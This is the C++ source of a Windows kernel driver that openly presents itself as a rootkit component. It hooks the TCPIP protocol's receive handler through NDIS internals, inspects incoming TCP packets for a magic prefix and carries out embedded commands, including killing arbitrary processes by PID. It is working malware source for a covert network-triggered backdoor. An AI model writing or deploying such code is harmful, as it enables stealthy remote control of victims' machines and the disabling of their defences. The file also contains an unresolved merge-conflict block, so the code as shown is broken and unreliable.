#include <ntifs.h>
#include <ntddk.h>

#define NDIS660 1
#define NDIS_PROTOCOL_DRIVER 1

#include <ndis.h>
#include <bugcodes.h>

#include <ndis.hpp> // interface functions
#include <packet.hpp>
#include <rootkit.hpp>
#include <utils.hpp>

NDIS_HANDLE g_ndis_protocol_handle = nullptr; // _NDIS_PROTOCOL_BLOCK structure

using recieve_net_buffers_list_t = void(__cdecl*)(NDIS_HANDLE, PNET_BUFFER_LIST,
	NDIS_PORT_NUMBER,
	ULONG,
	ULONG);

using prot_send_net_buffer_list_complete_t = void(__cdecl*)(NDIS_HANDLE, PNET_BUFFER_LIST, 
	ULONG);

recieve_net_buffers_list_t original_recieve_net_buffers_list = nullptr;
prot_send_net_buffer_list_complete_t original_prot_send_net_buffer_list_complete = nullptr;

void send_hook(NDIS_HANDLE filter_module_context, PNET_BUFFER_LIST net_buffer_list,
	ULONG send_complete_flags) {
	DbgPrint("(+) send hook | %p", filter_module_context);
	original_prot_send_net_buffer_list_complete(filter_module_context, net_buffer_list, 
		send_complete_flags);
}

void recieve_hook(NDIS_HANDLE filter_module_context, PNET_BUFFER_LIST net_buffer_list,
	NDIS_PORT_NUMBER port_number,
	ULONG net_buffer_list_count,
	ULONG recieve_flags) {
	//DbgPrint("(+) recieve hook | *FilterModuleContext: %p, *NetBufferLists: %p, PortNumber: %d, NumberOfNetBufferLists: %d, ReceiveFlags: %d\n", filter_module_context, net_buffer_list, port_number, net_buffer_list_count, recieve_flags);

	for (PNET_BUFFER_LIST current_nbl = net_buffer_list; current_nbl; current_nbl = NET_BUFFER_LIST_NEXT_NBL(current_nbl)) {
		for (PNET_BUFFER current_nb = NET_BUFFER_LIST_FIRST_NB(current_nbl); current_nb; current_nb = NET_BUFFER_NEXT_NB(current_nb)) {
			ULONG data_length = NET_BUFFER_DATA_LENGTH(current_nb);

			// Thanks @KeServiceDescriptorTable for pointing out that NdisGetDataBuffer can parse NET_BUFFER structures instead of manually walking MDLs
			// I was fr bouta do that icl :skull: - RainbowDynamix
			PUCHAR data = (PUCHAR)NdisGetDataBuffer(current_nb, data_length, NULL, 1, 0);
			if (!data)
				continue;

			tcp_packet parsedPacket;

			if (!parse_tcp_packet(data, data_length, &parsedPacket))
				continue;
			if (!tcp_payload_starts_with(parsedPacket, magic, szMagic))
				continue;

			ParsedCommand parsed_cmd;
			if (!parse_command(parsedPacket.payload, parsedPacket.payload_len, &parsed_cmd))
				continue;

			switch (parsed_cmd.command) {
			case Command::KILL: {
				KillPacket kill;
				if (!parse_kill_packet(parsed_cmd, &kill)) {
					DbgPrint("(!) KILL: invalid pid arg\n");
					break;
				}
				DbgPrint("(!) KILL pid=%lu\n", HandleToUlong(kill.pid));
				KillProcessById(kill.pid);
				break;
			}
			default:
				break;
			}
		}
	}

	original_recieve_net_buffers_list(filter_module_context, net_buffer_list,
		port_number,
		net_buffer_list_count,
		recieve_flags);
}

void driver_unload(PDRIVER_OBJECT driver_object) {
	UNREFERENCED_PARAMETER(driver_object);

	if (original_prot_send_net_buffer_list_complete || original_recieve_net_buffers_list) {
		auto* current_ndis_block = (PNDIS_PROTOCOL_BLOCK)g_ndis_protocol_handle;
		while (current_ndis_block) {
			if (!wcscmp(current_ndis_block->name.Buffer, L"TCPIP")) {
				if (original_prot_send_net_buffer_list_complete)
					current_ndis_block->open_queue->prot_send_net_buffer_list_complete = original_prot_send_net_buffer_list_complete;
				if (original_recieve_net_buffers_list)
					current_ndis_block->open_queue->recieve_net_buffer_lists = original_recieve_net_buffers_list;
				DbgPrint("(+) hooks removed\n");
				break;
			}
			current_ndis_block = current_ndis_block->next_protocol;
		}
	}

	if (g_ndis_protocol_handle) {
		g_ndis_protocol_handle = nullptr;
	}
}

NTSTATUS driver_entry(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path) {
	UNREFERENCED_PARAMETER(driver_object);
	UNREFERENCED_PARAMETER(registry_path);

	driver_object->DriverUnload = driver_unload;

	NDIS_PROTOCOL_DRIVER_CHARACTERISTICS protocol_characteristics = {};
	protocol_characteristics.Header.Type = NDIS_OBJECT_TYPE_PROTOCOL_DRIVER_CHARACTERISTICS;
	protocol_characteristics.Header.Revision = NDIS_PROTOCOL_DRIVER_CHARACTERISTICS_REVISION_2;
	protocol_characteristics.Header.Size = NDIS_SIZEOF_PROTOCOL_DRIVER_CHARACTERISTICS_REVISION_2;
	
	protocol_characteristics.MajorNdisVersion = 6;
	protocol_characteristics.MinorNdisVersion = 60;

	protocol_characteristics.MajorDriverVersion = 1;
	protocol_characteristics.MinorDriverVersion = 0;

<<<<<<< HEAD
	RtlInitUnicodeString(&protocol_characteristics.Name, L"SAHAPROT");
=======
	RtlInitUnicodeString(&protocolChar.Name, L"FAKEPROTOCOL");
>>>>>>> origin/dev

	protocol_characteristics.BindAdapterHandlerEx = ndis_interface::ProtoBindAdapterEx;
	protocol_characteristics.UnbindAdapterHandlerEx = ndis_interface::ProtoUnbindAdapterEx;
	protocol_characteristics.OpenAdapterCompleteHandlerEx = ndis_interface::ProtoOpenAdapterCompleteEx;
	protocol_characteristics.CloseAdapterCompleteHandlerEx = ndis_interface::ProtoCloseAdapterCompleteEx;
	protocol_characteristics.OidRequestCompleteHandler = ndis_interface::ProtoOidRequestComplete;
	protocol_characteristics.SendNetBufferListsCompleteHandler = ndis_interface::ProtoSendNetBufferListsComplete;
	protocol_characteristics.ReceiveNetBufferListsHandler = ndis_interface::ProtoReceiveNetBufferLists;
	protocol_characteristics.StatusHandlerEx = ndis_interface::ProtoStatusHandlerEx;
	protocol_characteristics.NetPnPEventHandler = ndis_interface::ProtoNetPnPEvent;
	protocol_characteristics.UninstallHandler = nullptr;

	auto status = NdisRegisterProtocolDriver(nullptr, &protocol_characteristics, &g_ndis_protocol_handle);
	if (!NT_SUCCESS(status))
		return status;

	DbgPrint("(+) g_ndis_protocol_handle : %p\n", g_ndis_protocol_handle);

	auto* current_ndis_block = (PNDIS_PROTOCOL_BLOCK)g_ndis_protocol_handle;
	do {
		if (!wcscmp(current_ndis_block->name.Buffer, L"TCPIP")) {
			original_prot_send_net_buffer_list_complete = current_ndis_block->open_queue->prot_send_net_buffer_list_complete;
		    original_recieve_net_buffers_list = current_ndis_block->open_queue->recieve_net_buffer_lists;

			//current_ndis_block->open_queue->prot_send_net_buffer_list_complete = send_hook;
			current_ndis_block->open_queue->recieve_net_buffer_lists = recieve_hook;

			DbgPrint("(+) hooks placed\n");
		}
		current_ndis_block = current_ndis_block->next_protocol;
	} while (current_ndis_block);

	return STATUS_SUCCESS;
}